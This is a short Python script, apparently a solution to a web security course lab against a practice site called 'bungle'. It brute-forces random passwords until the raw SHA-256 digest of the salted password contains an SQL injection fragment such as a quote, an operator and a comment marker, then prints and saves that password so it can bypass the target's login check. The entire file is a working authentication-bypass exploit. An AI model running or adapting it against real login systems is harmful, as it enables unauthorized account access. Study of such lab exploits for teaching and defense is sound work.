from hashlib import sha256
import random
import string
import re


while(1):

    # generate random password characters... could definitely make k smaller to speed this up, but this worked.
    passw = ''.join(random.choices(string.ascii_lowercase, k=1000))


    # encode the password using the same method as the target website (checkout website_source.py)
    password_bytes = ("bungle-" + \
    passw).encode("latin-1")
    password_digest = sha256(password_bytes).digest().decode("latin-1")
    
    # attempt to find any of the following regular expressions in the encoded password bytes
    # (I can definitely combine these regular expression searches into one, so I don't have to check 5 variables, but again... this worked....)
    a = re.findall("'\^0+(;|#|--)", password_digest)
    b = re.findall("'\|0+(;|#|--)", password_digest)
    c = re.findall("'=[0-9]+(;|#|--)", password_digest)
    d = re.findall("'&[0-9]+(;|#|--)", password_digest)
    e = re.findall("'<[1-9][0-9]*(;|#|--)", password_digest)

    # if any of the expressions match, print it out (yes, again, I could make this better). 
    if(a or b or c or d or e):
        print(a)
        print(b)
        print(c)
        print(d)
        print(e)

        # print the SQL Injectable password for entry
        print(passw)

        # paste it to file for redundancy
        f = open("test.txt", "w+")
        f.write(passw)
        f.close()

        print(password_digest)
        break